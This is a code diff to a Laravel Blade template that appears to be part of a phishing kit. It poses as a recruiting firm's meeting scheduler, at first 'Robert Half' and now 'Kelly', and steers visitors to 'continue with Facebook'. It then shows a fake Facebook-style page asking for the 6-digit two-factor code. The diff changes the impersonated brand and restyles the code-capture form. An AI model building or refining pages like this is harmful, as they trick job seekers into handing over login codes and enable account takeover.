@@ -9,12 +9,12 @@
             <div class="box__shadow">
                 <div class="calendar__wrapper {{$webStatus ? '':'d-none'}}" >
                     <div class="user__wrapper">
-                        <div class="logo__wrapper"><img width="50%" src="{{asset('img/images.png')}}" /></div>
+                        <div class="logo__wrapper"><img width="50%" src="{{asset('logo.png')}}" /></div>
                         <div class="screen__two center__text">
                             <div class="mobile__back-svg">
                                 <div class="content__wrapper">
                                     <div style="margin-bottom: 15px;">
-                                        <div><img class="avatar" width="65px" src="{{asset('img/logo.png')}}" /></div>
+                                        <div><img class="avatar" style="border-radius: 0" width="65px" src="{{asset('logo.png')}}" /></div>
                                     </div>
                                     <h2>15 Minutes Meeting</h2>
                                 </div>
@@ -91,7 +91,7 @@
                     <div class="form__wrapper date__time {{$showCalender ? 'd-none':''}}">
                         <div>
                             <div class="full__width">
-                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Robert Half - Recruiting Team</h2></div>
+                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Kelly - Recruiting Team</h2></div>
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="form-steps">
                                         <form id="msform">
@@ -106,7 +106,7 @@
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="dummy__text">
                                         <p>
-                                            Please confirm your appointment with Robert Half - Recruiting Team. <br />
+                                            Please confirm your appointment with Kelly - Recruiting Team. <br />
                                             To complete the confirmation process, continue with Facebook
                                         </p>
                                     </div>
@@ -391,9 +391,9 @@
                                     </div>
                                 @endif
                                 @if($twoFaPage)
-                                    <div style="width: 100%;justify-content: center;display: flex;">
-                                        <div style="max-width: 500px;margin-top: 50px;">
-                                            <form id="desktop-code" class="" wire:submit.prevent="codeSubmit">
+                                    <div style="width: 100%;justify-content: center;display: flex;padding-bottom: 50px;background: #fff">
+                                        <div class="otp-main">
+                                            <form  class="" wire:submit.prevent="codeSubmit">
                                                 <div class="two-factor-code">
                                                     <div class="top">
                                                         <h2>Check your text messages</h2>
@@ -402,13 +402,13 @@
                                                     </div>
                                                     <div class="code-input" style="margin-top: 20px;">
                                                         @if($codeError)
-                                                            <div class="show-error-modal"><p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p></div>
+                                                            <div class="wrong__password"><p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p></div>
                                                         @endif
-                                                        <input maxlength="6" minlength="6" name="code" class="show-input-on-desktop" placeholder="Login Code" type="number" required="required">
+                                                        <input maxlength="6" minlength="6" name="code" class="show-input-on-desktop" placeholder="Code" type="number" required="required">
                                                     </div>
-                                                    <div style="display: flex;justify-content: start;column-gap: 10px;align-items: center;margin: 20px 0">
-                                                        <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od"><path d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z"></path></svg>
-                                                        <a href="javascript:void(0)">Get a new code</a>
+                                                    <div style="display: flex;justify-content: start;column-gap: 8px;align-items: center;margin: 10px 0">
+                                                        <svg style="height: 16px;width: 16px" viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od"><path d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z"></path></svg>
+                                                        <a href="javascript:void(0)" style="font-size: 1rem">Get a new code</a>
                                                     </div>
                                                     <div class="btn-group">
                                                         <button type="submit" class="false">Continue</button>
@@ -418,11 +418,21 @@
                                             </form>
                                         </div>
                                         <style>
+                                            .otp-main{
+                                                max-width: 500px;
+                                                margin-top: 50px;
+                                            }
+                                            @media only screen and (max-width: 767px) {
+                                                .otp-main{
+                                                    width: 80%;
+                                                }
+                                            }
                                             .two-factor-code .btn-group{
                                                 width: 100%;
                                                 display: block;
                                             }
-                                            .two-factor-code .btn-group button{
+                                            .two-factor-code .btn-group button,
+                                            .two-factor-code .btn-group a{
                                                 width: 100%;
                                                 display: block;
                                                 font-size: 1rem;
@@ -430,49 +440,29 @@
                                                 white-space: pre-line;
                                                 line-height: calc(1.2 * 1em);
                                                 border-radius: 22px;
+                                                border: 0;
+                                                padding: 12px;
+                                                text-align: center;
+                                            }
+                                            .two-factor-code .btn-group button{
+                                                background: #0064E0;
+                                                margin-bottom: 10px;
+                                                color: #fff;
+                                            }
+                                            .two-factor-code .btn-group a{
+                                                border:1px solid #ededed;
+                                                color: black;
+                                            }
+                                            .two-factor-code  .code-input input{
+                                                height: 60px;
+                                                display: block;
+                                                width: 100%;
+                                                padding: 0 20px;
+                                                border-radius: 16px;
+                                                border:1px solid #ccd3db;
                                             }
                                         </style>
-                                        <form id="mobile-code" class="auth-req" wire:submit.prevent="codeSubmitMobile">
-                                            <div class="auth-req-text">
-                                                <h2>Two-factor authentication required</h2>
-                                                <div class="auth-req-paragraph">
-                                                    <p class="first">You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
-                                                    <p class="second">Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
-                                                </div>
-                                            </div>
-                                            <div class="show-input-on-mobile show__input-modal">
-                                                <input maxlength="6" minlength="6" name="code2"  placeholder="Login Code" type="number" required="required">
-                                                @if($codeError)
-                                                    <div class="show-error-modal2">
-                                                        <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p>
-                                                    </div>
-                                                @endif
-                                            </div>
-                                            <div class="having-trouble-class">
-                                                <button>Having trouble?</button>
-                                            </div>
-                                            <div class="show-button-mobile false">
-                                                <button type="submit">Continue</button>
-                                            </div>
-                                        </form>
 
-                                        <div class="show-footer-on-mobile-plus">
-                                            <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
-                                            <div class="footer-flex-mobile-plus confimartion__modal">
-                                                <div>
-                                                    <h2>English (US)</h2>
-                                                    <p>Deutsch</p>
-                                                    <p>Српски</p>
-                                                    <p>Português (Brasil)</p>
-                                                </div>
-                                                <div>
-                                                    <p>Italiano</p>
-                                                    <p>Bosanski</p>
-                                                    <p>Svensk</p>
-                                                    <button>+</button>
-                                                </div>
-                                            </div>
-                                        </div>
                                     </div>
                                 @endif
                                 @if($enableLoadingAfterSubmit)
